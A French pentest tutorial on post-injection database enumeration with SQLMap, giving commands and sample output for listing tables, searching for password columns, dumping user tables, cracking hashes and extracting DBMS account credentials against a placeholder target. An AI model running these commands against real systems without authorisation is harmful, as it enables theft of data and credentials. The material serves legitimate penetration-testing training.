# Enumeration de la base de donnees

## Pourquoi

Une fois la vulnérabilité SQLi confirmée, l'étape suivante consiste à extraire un maximum d'informations depuis la base de données cible. C'est le coeur de l'exploitation : identifier les bases, les tables, les colonnes, puis récupérer les données sensibles (identifiants, hashes, informations métier). SQLMap automatise ce processus en s'appuyant sur un fichier interne (`queries.xml`) qui contient les requêtes SQL adaptées à chaque SGBD supporté.

## Comment ca marche

SQLMap embarque un fichier XML (`queries.xml`) qui référence, pour chaque SGBD (MySQL, PostgreSQL, MSSQL, Oracle, etc.), les requêtes nécessaires à l'extraction de chaque type d'information : version, utilisateur courant, noms de tables, colonnes, données.

Selon le type d'injection détecté, SQLMap choisit la bonne variante de requête :

- **Injections non aveugles** (UNION, error-based) : la requête `inband` récupère les données directement dans la réponse HTTP.
- **Injections aveugles** (boolean-blind, time-blind) : la requête `blind` extrait les données bit par bit, ligne par ligne. C'est plus lent, mais tout aussi efficace.

Ce mécanisme est transparent : il suffit de passer le bon switch pour que SQLMap construise et exécute la requête appropriée.

## En pratique

### Informations de base

Les premiers réflexes après confirmation de l'injection : identifier la version du SGBD, l'utilisateur courant, la base active et les privilèges.

```bash
# Depuis Exegol - recuperation des infos de base
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --banner --current-user --current-db --is-dba
```

Résultat typique :

```bash
back-end DBMS: MySQL >= 5.0
banner: '5.1.41-3~bpo50+1'
current user: 'root@%'
current database: 'testdb'
current user is DBA: True
```

{% hint style="info" %}
L'utilisateur `root` dans le contexte de la base de données n'a généralement aucun rapport avec le `root` du système d'exploitation. Il s'agit d'un compte privilégié au sein du SGBD uniquement. Le même raisonnement s'applique au rôle DBA.
{% endhint %}

### Lister les tables et extraire des donnees

Une fois la base identifiée, on liste les tables puis on extrait le contenu ciblé.

```bash
# Lister les tables de la base "testdb"
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --tables -D testdb
```

```bash
Database: testdb
[4 tables]
+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

Pour dumper une table spécifique :

```bash
# Extraire la table "users"
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --dump -T users -D testdb
```

```bash
Database: testdb
Table: users
[4 entries]
+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+
```

Les données sont automatiquement sauvegardées en CSV dans le répertoire de sortie de SQLMap.

{% hint style="success" %}
Le format de sortie peut être changé avec `--dump-format`. Les options disponibles sont `CSV` (par défaut), `HTML` et `SQLite`. Le format SQLite est particulièrement pratique pour travailler avec les données ensuite dans un environnement dédié.
{% endhint %}

### Filtrer les colonnes et les lignes

Sur des tables volumineuses, inutile de tout récupérer. On peut cibler les colonnes pertinentes et restreindre les lignes.

```bash
# Colonnes specifiques uniquement
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --dump -T users -D testdb -C name,surname
```

```bash
# Lignes 2 a 3 (ordinal)
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --dump -T users -D testdb --start=2 --stop=3
```

```bash
Table: users
[2 entries]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+
```

Pour un filtrage conditionnel sur le contenu, `--where` applique une clause SQL :

```bash
# Filtrer par condition
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

### Dump complet

Trois niveaux de scope pour le dump :

| Commande | Perimetre |
|---|---|
| `--dump -D testdb` | Toutes les tables de la base spécifiée |
| `--dump-all` | Toutes les bases accessibles |
| `--dump-all --exclude-sysdbs` | Toutes les bases sauf les bases système |

{% hint style="warning" %}
Un `--dump-all` sans `--exclude-sysdbs` va récupérer les tables système (`information_schema`, `mysql`, `performance_schema`...), ce qui est rarement utile et rallonge considérablement le temps d'exécution.
{% endhint %}

### Schema de la base

Pour avoir une vue d'ensemble de l'architecture (toutes les tables, colonnes et types) sans extraire les données elles-mêmes :

```bash
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --schema
```

```bash
Database: testdb
Table: users
[3 columns]
+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+

Database: testdb
Table: data
[2 columns]
+---------+---------+
| Column  | Type    |
+---------+---------+
| content | blob    |
| id      | int(11) |
+---------+---------+
```

C'est la première chose à faire quand on découvre un environnement complexe avec de nombreuses bases et tables. Le schéma donne une cartographie complète avant de cibler les dumps.

### Rechercher dans la structure

Quand la base est vaste, `--search` permet de trouver des tables ou colonnes par mot-clé (opérateur LIKE en interne).

```bash
# Chercher toutes les tables contenant "user"
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --search -T user
```

```bash
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

Database: mysql
[1 table]
+-----------------+
| user            |
+-----------------+
```

```bash
# Chercher toutes les colonnes contenant "pass"
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --search -C pass
```

```bash
columns LIKE 'pass' were found in the following databases:
Database: master
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+

Database: mysql
Table: user
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(41) |
+----------+----------+
```

C'est un raccourci très efficace pour localiser rapidement les tables d'identifiants ou les colonnes sensibles sans connaître la structure à l'avance.

### Cracking automatique des hashes

Quand SQLMap détecte une valeur qui ressemble à un hash de mot de passe dans les données extraites, il propose automatiquement une attaque par dictionnaire. Le cracking se fait en multi-processus et supporte 31 algorithmes de hachage différents. Le dictionnaire intégré contient environ 1,4 million d'entrées, compilées à partir de fuites publiques.

```bash
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --dump -D master -T users
```

```bash
[INFO] recognized possible password hashes in column 'password'
do you want to crack them via a dictionary-based attack? [Y/n/q] Y

[INFO] using hash method 'sha1_generic_passwd'
[INFO] starting dictionary-based cracking (sha1_generic_passwd)
[INFO] starting 8 processes
[INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'
[INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'
```

Avec `--batch`, SQLMap lance le cracking automatiquement sans intervention.

### Mots de passe des comptes du SGBD

Au-delà des credentials applicatifs stockés dans les tables métier, on peut cibler les comptes de connexion du SGBD lui-même. L'option `--passwords` extrait les hashes des comptes système et tente de les casser :

```bash
sqlmap -u "http://<IP_CIBLE>/page.php?id=1" --passwords --batch
```

```bash
database management system users password hashes:

[*] debian-sys-maint [1]:
    password hash: *6B2C58EABD91C1776DA223B088B601604F898847
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```

{% hint style="success" %}
Le switch `--all` combiné avec `--batch` lance une énumération complète automatique : bannière, utilisateurs, bases, tables, colonnes, données, hashes, cracking. Le résultat complet est sauvegardé dans les fichiers de sortie. Pratique pour un premier passage large, mais l'exécution peut être très longue sur des bases volumineuses.
{% endhint %}

## Pieges et galeres

- **Injections aveugles et tables volumineuses** : l'extraction bit par bit sur de grandes tables peut prendre des heures. Cibler les colonnes pertinentes (`-C`) réduit drastiquement le temps.
- **Bases système dans le dump** : sans `--exclude-sysdbs`, le dump inclut `information_schema`, `mysql`, etc. C'est du bruit qui noie les données utiles.
- **Faux positifs sur les hashes** : SQLMap détecte parfois des colonnes non liées comme des hashes (UUIDs, tokens). Vérifier le contexte avant de lancer un cracking qui ne mènera nulle part.
- **Format de sortie** : le CSV par défaut peut être pénible à exploiter sur des tables avec beaucoup de colonnes. Passer en `--dump-format=SQLite` permet de requêter les données proprement ensuite.

## Retour terrain

En pentest, l'énumération de base de données suit généralement cette séquence :

1. `--banner --current-user --current-db --is-dba` pour le contexte initial.
2. `--schema` pour cartographier la structure.
3. `--search -T` et `--search -C` pour localiser les cibles (tables d'utilisateurs, colonnes de mots de passe).
4. `--dump` ciblé sur les tables pertinentes avec `-C` pour limiter le scope.
5. `--passwords` pour les credentials du SGBD si on est DBA.

Ne pas hésiter à utiliser `--where` pour filtrer les dumps sur des conditions métier (comptes admin, entrées récentes). Sur un engagement réel, un `--dump-all` sans discrimination génère un volume de données inexploitable et prend un temps disproportionné.

## Memo express

| Option | Description |
|---|---|
| `--banner` | Version du SGBD |
| `--current-user` | Utilisateur courant |
| `--current-db` | Base de données active |
| `--is-dba` | Vérifie les privilèges DBA |
| `--tables -D <db>` | Liste les tables d'une base |
| `--dump -T <table> -D <db>` | Extrait le contenu d'une table |
| `-C col1,col2` | Restreint aux colonnes spécifiées |
| `--start=N --stop=M` | Restreint aux lignes N a M |
| `--where="condition"` | Filtre conditionnel SQL |
| `--dump-all --exclude-sysdbs` | Dump complet hors bases système |
| `--dump-format=SQLite` | Format de sortie SQLite |
| `--schema` | Architecture complète (tables, colonnes, types) |
| `--search -T <mot>` | Recherche de tables par mot-clé |
| `--search -C <mot>` | Recherche de colonnes par mot-clé |
| `--passwords` | Hashes des comptes SGBD |
| `--all --batch` | Énumération automatique complète |

***
